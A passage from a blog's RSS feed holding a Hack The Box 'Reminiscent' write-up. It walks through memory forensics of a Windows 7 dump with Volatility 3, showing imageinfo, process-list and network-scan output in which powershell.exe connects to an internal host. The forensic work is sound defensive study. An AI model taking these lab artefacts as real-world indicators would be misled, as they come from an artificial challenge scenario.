<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Harshit Maheshwari</title>
        <link>https://harshitm98.github.io/posts/</link>
        <description>Recent content in Posts on Harshit Maheshwari</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Tue, 05 Apr 2022 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://harshitm98.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>HTB Reminiscent - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-challenge-reminiscent/</link>
            <pubDate>Tue, 05 Apr 2022 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-challenge-reminiscent/</guid>
            <description>Note: Before you begin, majority of this writeup uses volality3.0, so make sure you downloaded and have it setup on your system.
Setup  First download the zip file and unzip the contents. We have a file flounder-pc.memdump.elf and another file imageinfo.txt.  imageinfo.txt
Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS) AS Layer3 : FileAddressSpace (/home/infosec/dumps/mem_dumps/01/flounder-pc-memdump.elf) PAE type : No PAE DTB : 0x187000L KDBG : 0xf800027fe0a0L Number of Processors : 2 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff800027ffd00L KPCR for CPU 1 : 0xfffff880009eb000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2017-10-04 18:07:30 UTC+0000 Image local date and time : 2017-10-04 11:07:30 -0700 This file gives us the suggested profiles that we may need while running volatility.</description>
            <content type="html"><![CDATA[<p><em>Note: Before you begin, majority of this writeup uses <a href="https://github.com/volatilityfoundation/volatility3">volality3.0</a>, so make sure you downloaded and have it setup on your system.</em></p>
<h3 id="setup">Setup</h3>
<ul>
<li>First download the zip file and unzip the contents.</li>
<li>We have a file <code>flounder-pc.memdump.elf</code> and another file <code>imageinfo.txt</code>.</li>
</ul>
<p><em>imageinfo.txt</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : VirtualBoxCoreDumpElf64 (Unnamed AS)
                     AS Layer3 : FileAddressSpace (/home/infosec/dumps/mem_dumps/01/flounder-pc-memdump.elf)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf800027fe0a0L
          Number of Processors : 2
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff800027ffd00L
                KPCR for CPU 1 : 0xfffff880009eb000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2017-10-04 18:07:30 UTC+0000
     Image local date and time : 2017-10-04 11:07:30 -0700
</code></pre></div><p>This file gives us the suggested profiles that we may need while running volatility. Let&rsquo;s choose the first profile: <code>Win7SP1x64</code></p>
<h3 id="running-volatility3">Running volatility3</h3>
<p>You can run commands which uses plugins like <code>windows.info</code> to get to know more about your machine.</p>
<p><strong>Getting list of processes using <code>windows.pslist</code></strong></p>
<ul>
<li>This plugin gives running processes on the machine at the time of the memory dump. Just like running <code>ps</code> on linux system.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ /opt/volatility3/vol.py -f flounder-pc-memdump.elf windows.pslist
Volatility <span style="color:#ae81ff">3</span> Framework 1.0.0
Progress:  100.00               PDB scanning finished
PID     PPID    ImageFileName   Offset<span style="color:#f92672">(</span>V<span style="color:#f92672">)</span>       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output

<span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">0</span>       System  0xfa80006b7040  <span style="color:#ae81ff">83</span>      <span style="color:#ae81ff">477</span>     N/A     False   2017-10-04 18:04:27.000000      N/A     Disabled
<span style="color:#ae81ff">272</span>     <span style="color:#ae81ff">4</span>       smss.exe        0xfa8001a63b30  <span style="color:#ae81ff">2</span>       <span style="color:#ae81ff">30</span>      N/A     False   2017-10-04 18:04:27.000000      N/A     Disabled
<span style="color:#ae81ff">348</span>     <span style="color:#ae81ff">328</span>     csrss.exe       0xfa800169bb30  <span style="color:#ae81ff">9</span>       <span style="color:#ae81ff">416</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:29.000000      N/A     Disabled
<span style="color:#ae81ff">376</span>     <span style="color:#ae81ff">328</span>     wininit.exe     0xfa8001f63b30  <span style="color:#ae81ff">3</span>       <span style="color:#ae81ff">77</span>      <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:29.000000      N/A     Disabled
<span style="color:#ae81ff">396</span>     <span style="color:#ae81ff">384</span>     csrss.exe       0xfa8001efa500  <span style="color:#ae81ff">9</span>       <span style="color:#ae81ff">283</span>     <span style="color:#ae81ff">1</span>       False   2017-10-04 18:04:29.000000      N/A     Disabled
<span style="color:#ae81ff">432</span>     <span style="color:#ae81ff">384</span>     winlogon.exe    0xfa8001f966d0  <span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">112</span>     <span style="color:#ae81ff">1</span>       False   2017-10-04 18:04:29.000000      N/A     Disabled
<span style="color:#ae81ff">476</span>     <span style="color:#ae81ff">376</span>     services.exe    0xfa8001fcdb30  <span style="color:#ae81ff">11</span>      <span style="color:#ae81ff">201</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:29.000000      N/A     Disabled
<span style="color:#ae81ff">492</span>     <span style="color:#ae81ff">376</span>     lsass.exe       0xfa8001ff2b30  <span style="color:#ae81ff">8</span>       <span style="color:#ae81ff">590</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
<span style="color:#ae81ff">500</span>     <span style="color:#ae81ff">376</span>     lsm.exe 0xfa8001fffb30  <span style="color:#ae81ff">11</span>      <span style="color:#ae81ff">150</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
<span style="color:#ae81ff">600</span>     <span style="color:#ae81ff">476</span>     svchost.exe     0xfa8002001b30  <span style="color:#ae81ff">12</span>      <span style="color:#ae81ff">360</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
<span style="color:#ae81ff">664</span>     <span style="color:#ae81ff">476</span>     VBoxService.ex  0xfa800209bb30  <span style="color:#ae81ff">12</span>      <span style="color:#ae81ff">118</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
<span style="color:#ae81ff">728</span>     <span style="color:#ae81ff">476</span>     svchost.exe     0xfa80020b5b30  <span style="color:#ae81ff">7</span>       <span style="color:#ae81ff">270</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
<span style="color:#ae81ff">792</span>     <span style="color:#ae81ff">476</span>     svchost.exe     0xfa80021044a0  <span style="color:#ae81ff">21</span>      <span style="color:#ae81ff">443</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
<span style="color:#ae81ff">868</span>     <span style="color:#ae81ff">476</span>     svchost.exe     0xfa8002166b30  <span style="color:#ae81ff">21</span>      <span style="color:#ae81ff">429</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
<span style="color:#ae81ff">900</span>     <span style="color:#ae81ff">476</span>     svchost.exe     0xfa800217cb30  <span style="color:#ae81ff">41</span>      <span style="color:#ae81ff">977</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
<span style="color:#ae81ff">988</span>     <span style="color:#ae81ff">476</span>     svchost.exe     0xfa80021ccb30  <span style="color:#ae81ff">13</span>      <span style="color:#ae81ff">286</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
<span style="color:#ae81ff">384</span>     <span style="color:#ae81ff">476</span>     svchost.exe     0xfa8002204960  <span style="color:#ae81ff">17</span>      <span style="color:#ae81ff">386</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:30.000000      N/A     Disabled
<span style="color:#ae81ff">1052</span>    <span style="color:#ae81ff">476</span>     spoolsv.exe     0xfa8002294b30  <span style="color:#ae81ff">13</span>      <span style="color:#ae81ff">277</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:31.000000      N/A     Disabled
<span style="color:#ae81ff">1092</span>    <span style="color:#ae81ff">476</span>     svchost.exe     0xfa80022bbb30  <span style="color:#ae81ff">19</span>      <span style="color:#ae81ff">321</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:31.000000      N/A     Disabled
<span style="color:#ae81ff">1196</span>    <span style="color:#ae81ff">476</span>     svchost.exe     0xfa8002390620  <span style="color:#ae81ff">28</span>      <span style="color:#ae81ff">333</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:31.000000      N/A     Disabled
<span style="color:#ae81ff">1720</span>    <span style="color:#ae81ff">476</span>     taskhost.exe    0xfa8002245060  <span style="color:#ae81ff">8</span>       <span style="color:#ae81ff">148</span>     <span style="color:#ae81ff">1</span>       False   2017-10-04 18:04:36.000000      N/A     Disabled
<span style="color:#ae81ff">1840</span>    <span style="color:#ae81ff">476</span>     sppsvc.exe      0xfa8002122060  <span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">145</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:37.000000      N/A     Disabled
<span style="color:#ae81ff">2020</span>    <span style="color:#ae81ff">868</span>     dwm.exe 0xfa80022c8060  <span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">72</span>      <span style="color:#ae81ff">1</span>       False   2017-10-04 18:04:41.000000      N/A     Disabled
<span style="color:#ae81ff">2044</span>    <span style="color:#ae81ff">2012</span>    explorer.exe    0xfa80020bb630  <span style="color:#ae81ff">36</span>      <span style="color:#ae81ff">926</span>     <span style="color:#ae81ff">1</span>       False   2017-10-04 18:04:41.000000      N/A     Disabled
<span style="color:#ae81ff">1476</span>    <span style="color:#ae81ff">2044</span>    VBoxTray.exe    0xfa80022622e0  <span style="color:#ae81ff">13</span>      <span style="color:#ae81ff">146</span>     <span style="color:#ae81ff">1</span>       False   2017-10-04 18:04:42.000000      N/A     Disabled
<span style="color:#ae81ff">1704</span>    <span style="color:#ae81ff">476</span>     SearchIndexer.  0xfa80021b4060  <span style="color:#ae81ff">16</span>      <span style="color:#ae81ff">734</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:47.000000      N/A     Disabled
<span style="color:#ae81ff">812</span>     <span style="color:#ae81ff">1704</span>    SearchFilterHo  0xfa80023ed550  <span style="color:#ae81ff">4</span>       <span style="color:#ae81ff">92</span>      <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:48.000000      N/A     Disabled
<span style="color:#ae81ff">1960</span>    <span style="color:#ae81ff">1704</span>    SearchProtocol  0xfa80024f4b30  <span style="color:#ae81ff">6</span>       <span style="color:#ae81ff">311</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:04:48.000000      N/A     Disabled
<span style="color:#ae81ff">2812</span>    <span style="color:#ae81ff">2044</span>    thunderbird.ex  0xfa80007e0b30  <span style="color:#ae81ff">50</span>      <span style="color:#ae81ff">534</span>     <span style="color:#ae81ff">1</span>       True    2017-10-04 18:06:24.000000      N/A     Disabled
<span style="color:#ae81ff">2924</span>    <span style="color:#ae81ff">600</span>     WmiPrvSE.exe    0xfa8000801b30  <span style="color:#ae81ff">10</span>      <span style="color:#ae81ff">204</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:06:26.000000      N/A     Disabled
<span style="color:#ae81ff">2120</span>    <span style="color:#ae81ff">476</span>     svchost.exe     0xfa8000945060  <span style="color:#ae81ff">12</span>      <span style="color:#ae81ff">335</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:06:32.000000      N/A     Disabled
<span style="color:#ae81ff">2248</span>    <span style="color:#ae81ff">476</span>     wmpnetwk.exe    0xfa800096eb30  <span style="color:#ae81ff">18</span>      <span style="color:#ae81ff">489</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:06:33.000000      N/A     Disabled
<span style="color:#ae81ff">592</span>     <span style="color:#ae81ff">600</span>     WmiPrvSE.exe    0xfa8000930b30  <span style="color:#ae81ff">9</span>       <span style="color:#ae81ff">127</span>     <span style="color:#ae81ff">0</span>       False   2017-10-04 18:06:35.000000      N/A     Disabled
<span style="color:#ae81ff">496</span>     <span style="color:#ae81ff">2044</span>    powershell.exe  0xfa800224e060  <span style="color:#ae81ff">12</span>      <span style="color:#ae81ff">300</span>     <span style="color:#ae81ff">1</span>       False   2017-10-04 18:06:58.000000      N/A     Disabled
<span style="color:#ae81ff">2772</span>    <span style="color:#ae81ff">396</span>     conhost.exe     0xfa8000e90060  <span style="color:#ae81ff">2</span>       <span style="color:#ae81ff">55</span>      <span style="color:#ae81ff">1</span>       False   2017-10-04 18:06:58.000000      N/A     Disabled
<span style="color:#ae81ff">2752</span>    <span style="color:#ae81ff">496</span>     powershell.exe  0xfa8000839060  <span style="color:#ae81ff">20</span>      <span style="color:#ae81ff">396</span>     <span style="color:#ae81ff">1</span>       False   2017-10-04 18:07:00.000000      N/A     Disabled
</code></pre></div><p>This wasn&rsquo;t that helpful. One key-takeaway could be that <code>powershell.exe</code> is running. Let&rsquo;s note the PID: 2752.</p>
<p><strong>Getting live connections using <code>windows.netscan</code></strong></p>
<ul>
<li>This plugin gives us the connections at the time of the memory dump. Just like running <code>netstat</code> command.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ /opt/volatility3/vol.py -f flounder-pc-memdump.elf windows.netscan
Volatility <span style="color:#ae81ff">3</span> Framework 1.0.0
Progress:  100.00               PDB scanning finished
Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created

0x1e069840      UDPv4   10.10.100.43    <span style="color:#ae81ff">137</span>     *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">4</span>       System  2017-10-04 18:04:31.000000
0x1e06a950      TCPv4   10.10.100.43    <span style="color:#ae81ff">139</span>     0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
0x1e078670      TCPv4   0.0.0.0 <span style="color:#ae81ff">5357</span>    0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
0x1e078670      TCPv6   ::      <span style="color:#ae81ff">5357</span>    ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
0x1e0a8ec0      UDPv4   0.0.0.0 <span style="color:#ae81ff">60655</span>   *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:31.000000
0x1e0a8ec0      UDPv6   ::      <span style="color:#ae81ff">60655</span>   *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:31.000000
0x1e0ac8a0      TCPv4   0.0.0.0 <span style="color:#ae81ff">49155</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">476</span>     services.exe    -
0x1e0b0a50      UDPv4   0.0.0.0 <span style="color:#ae81ff">60654</span>   *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:31.000000
0x1e0e08a0      TCPv4   0.0.0.0 <span style="color:#ae81ff">445</span>     0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
0x1e0e08a0      TCPv6   ::      <span style="color:#ae81ff">445</span>     ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
0x1e0f9010      UDPv4   0.0.0.0 <span style="color:#ae81ff">5004</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e243b20      TCPv4   0.0.0.0 <span style="color:#ae81ff">49154</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">900</span>     svchost.exe     -
0x1e27f980      TCPv4   0.0.0.0 <span style="color:#ae81ff">49154</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">900</span>     svchost.exe     -
0x1e27f980      TCPv6   ::      <span style="color:#ae81ff">49154</span>   ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">900</span>     svchost.exe     -
0x1e28f1a0      UDPv4   0.0.0.0 <span style="color:#ae81ff">5005</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e28f1a0      UDPv6   ::      <span style="color:#ae81ff">5005</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e2ec510      TCPv6   -       <span style="color:#ae81ff">0</span>       382b:ff01:80fa:ffff:a010:4502:80fa:ffff <span style="color:#ae81ff">0</span>       CLOSED  <span style="color:#ae81ff">384</span>     svchost.exe     N/A
0x1e2f33f0      TCPv4   0.0.0.0 <span style="color:#ae81ff">49157</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">492</span>     lsass.exe       -
0x1e2fc460      UDPv4   127.0.0.1       <span style="color:#ae81ff">54573</span>   *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:06:34.000000
0x1e391b30      TCPv4   0.0.0.0 <span style="color:#ae81ff">49155</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">476</span>     services.exe    -
0x1e391b30      TCPv6   ::      <span style="color:#ae81ff">49155</span>   ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">476</span>     services.exe    -
0x1e3c5da0      UDPv4   0.0.0.0 <span style="color:#ae81ff">5005</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e3f7010      UDPv4   0.0.0.0 <span style="color:#ae81ff">5355</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">384</span>     svchost.exe     2017-10-04 18:04:35.000000
0x1e3f7010      UDPv6   ::      <span style="color:#ae81ff">5355</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">384</span>     svchost.exe     2017-10-04 18:04:35.000000
0x1e3fb010      UDPv4   0.0.0.0 <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">384</span>     svchost.exe     2017-10-04 18:04:33.000000
0x1e3fb010      UDPv6   ::      <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">384</span>     svchost.exe     2017-10-04 18:04:33.000000
0x1e47a730      TCPv6   -       <span style="color:#ae81ff">0</span>       6890:8300:80fa:ffff:6890:8300:80fa:ffff <span style="color:#ae81ff">0</span>       CLOSED  <span style="color:#ae81ff">2752</span>    powershell.exe  -
0x1e4c1e60      TCPv4   0.0.0.0 <span style="color:#ae81ff">135</span>     0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">728</span>     svchost.exe     -
0x1e4c30a0      TCPv4   0.0.0.0 <span style="color:#ae81ff">135</span>     0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">728</span>     svchost.exe     -
0x1e4c30a0      TCPv6   ::      <span style="color:#ae81ff">135</span>     ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">728</span>     svchost.exe     -
0x1e4d7e70      TCPv4   0.0.0.0 <span style="color:#ae81ff">49152</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">376</span>     wininit.exe     -
0x1e4d7e70      TCPv6   ::      <span style="color:#ae81ff">49152</span>   ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">376</span>     wininit.exe     -
0x1e517800      TCPv6   -       <span style="color:#ae81ff">0</span>       38cb:1702:80fa:ffff:38cb:1702:80fa:ffff <span style="color:#ae81ff">0</span>       CLOSED  <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    N/A
0x1e556820      TCPv4   0.0.0.0 <span style="color:#ae81ff">49153</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">792</span>     svchost.exe     -
0x1e556820      TCPv6   ::      <span style="color:#ae81ff">49153</span>   ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">792</span>     svchost.exe     -
0x1e5689e0      TCPv4   0.0.0.0 <span style="color:#ae81ff">49153</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">792</span>     svchost.exe     -
0x1e5a3250      UDPv4   0.0.0.0 <span style="color:#ae81ff">5355</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">384</span>     svchost.exe     2017-10-04 18:04:35.000000
0x1e5cdef0      TCPv4   0.0.0.0 <span style="color:#ae81ff">49157</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">492</span>     lsass.exe       -
0x1e5cdef0      TCPv6   ::      <span style="color:#ae81ff">49157</span>   ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">492</span>     lsass.exe       -
0x1e5fa480      UDPv4   127.0.0.1       <span style="color:#ae81ff">1900</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:06:34.000000
0x1e774a60      UDPv4   10.10.100.43    <span style="color:#ae81ff">138</span>     *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">4</span>       System  2017-10-04 18:04:31.000000
0x1e7d7a60      TCPv6   -       <span style="color:#ae81ff">0</span>       6890:8300:80fa:ffff:6890:8300:80fa:ffff <span style="color:#ae81ff">0</span>       CLOSED  <span style="color:#ae81ff">2752</span>    powershell.exe  N/A
0x1e85e010      UDPv6   ::1     <span style="color:#ae81ff">1900</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:06:34.000000
0x1e8fb010      UDPv4   0.0.0.0 <span style="color:#ae81ff">5004</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e8fb010      UDPv6   ::      <span style="color:#ae81ff">5004</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    2017-10-04 18:06:34.000000
0x1e8ff010      UDPv4   10.10.100.43    <span style="color:#ae81ff">1900</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:06:34.000000
0x1e903b10      UDPv6   ::1     <span style="color:#ae81ff">54572</span>   *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:06:34.000000
0x1e909010      UDPv4   0.0.0.0 <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2752</span>    powershell.exe  2017-10-04 18:07:01.000000
0x1ec304b0      UDPv4   0.0.0.0 <span style="color:#ae81ff">3702</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:34.000000
0x1ed592b0      UDPv4   0.0.0.0 <span style="color:#ae81ff">3702</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:34.000000
0x1ee7cd20      TCPv4   0.0.0.0 <span style="color:#ae81ff">49152</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">376</span>     wininit.exe     -
0x1eec14e0      UDPv4   0.0.0.0 <span style="color:#ae81ff">3702</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:34.000000
0x1eec14e0      UDPv6   ::      <span style="color:#ae81ff">3702</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:34.000000
0x1f1ea4f0      UDPv4   0.0.0.0 <span style="color:#ae81ff">3702</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:34.000000
0x1f1ea4f0      UDPv6   ::      <span style="color:#ae81ff">3702</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:04:34.000000
0x1f6c1010      UDPv4   0.0.0.0 <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2752</span>    powershell.exe  2017-10-04 18:07:01.000000
0x1f6c1010      UDPv6   ::      <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2752</span>    powershell.exe  2017-10-04 18:07:01.000000
0x1f6c2ec0      UDPv4   0.0.0.0 <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2752</span>    powershell.exe  2017-10-04 18:07:01.000000
0x1fc04010      TCPv6   -       <span style="color:#ae81ff">0</span>       6890:8300:80fa:ffff:6890:8300:80fa:ffff <span style="color:#ae81ff">0</span>       CLOSED  <span style="color:#ae81ff">2752</span>    powershell.exe  N/A
0x1fc04490      TCPv4   10.10.100.43    <span style="color:#ae81ff">49246</span>   10.10.99.55     <span style="color:#ae81ff">80</span>      CLOSED  <span style="color:#ae81ff">2752</span>    powershell.exe  -
0x1fc15010      TCPv6   ::1     <span style="color:#ae81ff">2869</span>    ::1     <span style="color:#ae81ff">49237</span>   ESTABLISHED     <span style="color:#ae81ff">4</span>       System  N/A
0x1fc3d320      TCPv4   10.10.100.43    <span style="color:#ae81ff">49247</span>   10.10.99.55     <span style="color:#ae81ff">80</span>      CLOSED  <span style="color:#ae81ff">2752</span>    powershell.exe  -
0x1fc769d0      TCPv4   127.0.0.1       <span style="color:#ae81ff">49232</span>   127.0.0.1       <span style="color:#ae81ff">49231</span>   ESTABLISHED     <span style="color:#ae81ff">2812</span>    thunderbird.ex  N/A
0x1fc76cf0      TCPv4   127.0.0.1       <span style="color:#ae81ff">49231</span>   127.0.0.1       <span style="color:#ae81ff">49232</span>   ESTABLISHED     <span style="color:#ae81ff">2812</span>    thunderbird.ex  N/A
0x1fc85010      UDPv6   fe80::6cee:b5c1:4a75:f04b       <span style="color:#ae81ff">1900</span>    *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">1196</span>    svchost.exe     2017-10-04 18:06:34.000000
0x1fc8e680      UDPv4   0.0.0.0 <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2752</span>    powershell.exe  2017-10-04 18:07:01.000000
0x1fc8e680      UDPv6   ::      <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">2752</span>    powershell.exe  2017-10-04 18:07:01.000000
0x1fc99db0      TCPv4   0.0.0.0 <span style="color:#ae81ff">554</span>     0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    -
0x1fcc2b80      TCPv4   0.0.0.0 <span style="color:#ae81ff">2869</span>    0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
0x1fcc2b80      TCPv6   ::      <span style="color:#ae81ff">2869</span>    ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
0x1fcc8010      TCPv6   ::1     <span style="color:#ae81ff">49237</span>   ::1     <span style="color:#ae81ff">2869</span>    ESTABLISHED     <span style="color:#ae81ff">2248</span>    wmpnetwk.exe    N/A
0x1fcdbec0      UDPv4   0.0.0.0 <span style="color:#ae81ff">0</span>       *       <span style="color:#ae81ff">0</span>               <span style="color:#ae81ff">664</span>     VBoxService.ex  2017-10-04 18:06:56.000000
0x1fcf4940      TCPv4   10.10.100.43    <span style="color:#ae81ff">49233</span>   10.10.20.166    <span style="color:#ae81ff">143</span>     ESTABLISHED     <span style="color:#ae81ff">2812</span>    thunderbird.ex  N/A
0x1fd01780      TCPv4   0.0.0.0 <span style="color:#ae81ff">10243</span>   0.0.0.0 <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
0x1fd01780      TCPv6   ::      <span style="color:#ae81ff">10243</span>   ::      <span style="color:#ae81ff">0</span>       LISTENING       <span style="color:#ae81ff">4</span>       System  -
